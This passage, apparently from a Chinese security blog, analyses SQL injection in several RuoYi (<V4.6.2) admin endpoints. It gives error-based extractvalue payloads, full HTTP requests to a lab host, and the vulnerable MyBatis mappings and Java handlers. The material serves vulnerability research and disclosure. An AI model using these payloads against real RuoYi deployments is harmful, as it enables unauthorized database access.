class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresPermissions(&quot;system:user:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/list&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">list</span><span class="hljs-params">(SysUser user)</span><br>&#123;<br>    startPage();<br>    List&lt;SysUser&gt; list = userService.selectUserList(user);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-注入点-dept-list接口（"><a href="#2-4-注入点-dept-list接口（" class="headerlink" title="2.4 注入点/dept/list接口（&lt;V4.6.2）"></a>2.4 注入点<code>/dept/list</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634717740-33e531a0-0f57-45e3-ac2c-76c8b5d8bd51.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634698973-a4d30ae5-4953-4232-aa6c-b161e2d4797f.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>93<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/dept<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">deptName</span>=&amp;status=&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634663397-fa811ccd-7514-4f7b-8507-a41c7f41ed0b.png"></p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectDeptList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysDept&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysDeptResult&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;selectDeptVo&quot;</span>/&gt;</span><br>       where d.del_flag = &#x27;0&#x27;<br>       <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;parentId != null and parentId != 0&quot;</span>&gt;</span><br>AND parent_id = #&#123;parentId&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;deptName != null and deptName != &#x27;&#x27;&quot;</span>&gt;</span><br>AND dept_name like concat(&#x27;%&#x27;, #&#123;deptName&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>AND status = #&#123;status&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>$&#123;params.dataScope&#125;<br>order by d.parent_id, d.order_num<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresPermissions(&quot;system:dept:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/list&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> List&lt;SysDept&gt; <span class="hljs-title function_">list</span><span class="hljs-params">(SysDept dept)</span><br>&#123;<br>    List&lt;SysDept&gt; deptList = deptService.selectDeptList(dept);<br>    <span class="hljs-keyword">return</span> deptList;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-注入点-role-authUser-allocatedList接口（"><a href="#2-5-注入点-role-authUser-allocatedList接口（" class="headerlink" title="2.5 注入点/role/authUser/allocatedList接口（&lt;V4.6.2）"></a>2.5 注入点<code>/role/authUser/allocatedList</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754635129514-7b26dc12-8951-4a0e-a60f-90ab79d6fad0.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/authUser/allocatedList</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>166<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/role/authUser/1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><br><span class="language-apache"><span class="hljs-attribute">pageSize</span>=<span class="hljs-number">10</span>&amp;pageNum=<span class="hljs-number">1</span>&amp;orderByColumn=createTime&amp;isAsc=desc&amp;roleId=<span class="hljs-number">1</span>&amp;loginName=&amp;phonenumber=&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754635196675-73883f88-8723-4346-977a-7161bb89c526.png"></p><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectAllocatedList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysUser&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysUserResult&quot;</span>&gt;</span><br>    select distinct u.user_id, u.dept_id, u.login_name, u.user_name, u.user_type, u.email, u.avatar, u.phonenumber, u.status, u.create_time<br>    from sys_user u<br> left join sys_dept d on u.dept_id = d.dept_id<br> left join sys_user_role ur on u.user_id = ur.user_id<br> left join sys_role r on r.role_id = ur.role_id<br>    where u.del_flag = &#x27;0&#x27; and r.role_id = #&#123;roleId&#125;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;loginName != null and loginName != &#x27;&#x27;&quot;</span>&gt;</span><br>AND u.login_name like concat(&#x27;%&#x27;, #&#123;loginName&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;phonenumber != null and phonenumber != &#x27;&#x27;&quot;</span>&gt;</span><br>AND u.phonenumber like concat(&#x27;%&#x27;, #&#123;phonenumber&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 查询已分配用户角色列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:role:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/authUser/allocatedList&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">allocatedList</span><span class="hljs-params">(SysUser user)</span><br>&#123;<br>    startPage();<br>    List&lt;SysUser&gt; list = userService.selectAllocatedList(user);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-6-注入点-role-authUser-unallocatedList接口（"><a href="#2-6-注入点-role-authUser-unallocatedList接口（" class="headerlink" title="2.6 注入点/role/authUser/unallocatedList接口（&lt;V4.6.2）"></a>2.6 注入点<code>/role/authUser/unallocatedList</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>通过接口<code>/system/role/authUser/unallocatedList</code>发送 post 请求实现 sql 注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">loginName=&amp;phoneNumber=&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754638637997-d67eb89c-90d5-4750-a0cf-1331c49c2b6f.png"></p><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectUnallocatedList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysUser&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysUserResult&quot;</span>&gt;</span><br>    select distinct u.user_id, u.dept_id, u.login_name, u.user_name, u.user_type, u.email, u.avatar, u.phonenumber, u.status, u.create_time<br>    from sys_user u<br> left join sys_dept d on u.dept_id = d.dept_id<br> left join sys_user_role ur on u.user_id = ur.user_id<br> left join sys_role r on r.role_id = ur.role_id<br>    where u.del_flag = &#x27;0&#x27; and (r.role_id != #&#123;roleId&#125; or r.role_id IS NULL)<br>    and u.user_id not in (select u.user_id from sys_user u inner join sys_user_role ur on u.user_id = ur.user_id and ur.role_id = #&#123;roleId&#125;)<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;loginName != null and loginName != &#x27;&#x27;&quot;</span>&gt;</span><br>AND u.login_name like concat(&#x27;%&#x27;, #&#123;loginName&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;phonenumber != null and phonenumber != &#x27;&#x27;&quot;</span>&gt;</span><br>AND u.phonenumber like concat(&#x27;%&#x27;, #&#123;phonenumber&#125;, &#x27;%&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 查询未分配用户角色列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:role:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/authUser/unallocatedList&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">unallocatedList</span><span class="hljs-params">(SysUser user)</span><br>&#123;<br>    startPage();<br>    List&lt;SysUser&gt; list = userService.selectUnallocatedList(user);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-7-注入点-dept-edit接口（"><a href="#2-7-注入点-dept-edit接口（" class="headerlink" title="2.7 注入点/dept/edit接口（&lt;V4.6.2）"></a>2.7 注入点<code>/dept/edit</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞貌似很鸡肋，第一无法完全显示数据，第二是那个<code>ancestors</code>参数的长度似乎有限制；</p><p>因此想要完全的实现泄漏数据几乎不可能，想要进行 sql 盲注其实也不太可能，因为长度有限制；各位如果有能够在该漏洞实现危害扩大的方法请务必告诉我；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754641429583-1794b68f-1b63-450f-bdf8-e95b51bb3bd6.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754641445829-9f0eae2b-146a-4306-81f1-9d7919141c15.png"></p><p>抓取到上述数据包以后，修改<code>parentId</code>传输参数为<code>0</code>，然后再添加一下 payload 发送数据包；</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;ordernum=1&amp;ancestors=100)or(extractvalue(1,concat((select user()))));#<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/edit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>277<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/dept/edit/101<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=bb95c391-ec91-4058-a127-3616bb3fb37d<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-llvm">deptId<span class="hljs-operator">=</span><span class="hljs-number">101</span>&amp;parentId<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;parentName<span class="hljs-operator">=</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%BE</span><span class="hljs-variable">%9</span>D<span class="hljs-variable">%E7</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%91</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%8</span>A<span class="hljs-variable">%80</span>&amp;deptName<span class="hljs-operator">=</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%B3</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%80</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%B8</span>&amp;orderNum<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;leader<span class="hljs-operator">=</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%BE</span><span class="hljs-variable">%9</span>D&amp;phone<span class="hljs-operator">=</span><span class="hljs-number">15888888888</span>&amp;email<span class="hljs-operator">=</span>ry<span class="hljs-variable">%40</span>qq.com&amp;status<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;ordernum<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;ancestors<span class="hljs-operator">=</span><span class="hljs-number">100</span>)<span class="hljs-keyword">or</span>(<span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat((<span class="hljs-keyword">select</span> user()))))<span class="hljs-comment">;#</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754640934946-9722f587-d554-48df-a758-3c4c3f62f8a4.png"></p><h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先通过 Mybatis 配置文件进行查找，发现存在可能存在 sql 注入的配置，如下，位于<code>RuoYi-4.6.0/ruoyi-system/src/main/resources/mapper/system/SysDeptMapper.xml</code>；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateDeptStatus&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysDept&quot;</span>&gt;</span><br>    update sys_dept<br>    <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span>status = #&#123;status&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;updateBy != null and updateBy != &#x27;&#x27;&quot;</span>&gt;</span>update_by = #&#123;updateBy&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>        update_time = sysdate()<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span><br>    where dept_id in ($&#123;ancestors&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用插件<code>MybatisX</code>找到相关函数<code>RuoYi-4.6.0/ruoyi-system/src/main/java/com/ruoyi/system/mapper/SysDeptMapper.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 修改所在部门的父级部门状态</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> dept 部门</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateDeptStatus</span><span class="hljs-params">(SysDept dept)</span>;<br></code></pre></td></tr></table></figure><p>通过函数查找用法可以找到<code>RuoYi-4.6.0/ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysDeptServiceImpl.java#updateParentDeptStatus</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 修改该部门的父级部门状态</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> dept 当前部门</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateParentDeptStatus</span><span class="hljs-params">(SysDept dept)</span><br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">updateBy</span> <span class="hljs-operator">=</span> dept.getUpdateBy();<br>    dept = deptMapper.selectDeptById(dept.getDeptId());<br>    dept.setUpdateBy(updateBy);<br>    deptMapper.updateDeptStatus(dept);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续查找用法可以找到<code>RuoYi-4.6.0/ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysDeptServiceImpl.java#updateDept</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 修改保存部门信息</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> dept 部门信息</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 结果</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateDept</span><span class="hljs-params">(SysDept dept)</span><br>&#123;<br>    <span class="hljs-type">SysDept</span> <span class="hljs-variable">newParentDept</span> <span class="hljs-operator">=</span> deptMapper.selectDeptById(dept.getParentId());<br>    <span class="hljs-type">SysDept</span> <span class="hljs-variable">oldDept</span> <span class="hljs-operator">=</span> selectDeptById(dept.getDeptId());<br>    <span class="hljs-keyword">if</span> (StringUtils.isNotNull(newParentDept) &amp;&amp; StringUtils.isNotNull(oldDept))<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">newAncestors</span> <span class="hljs-operator">=</span> newParentDept.getAncestors() + <span 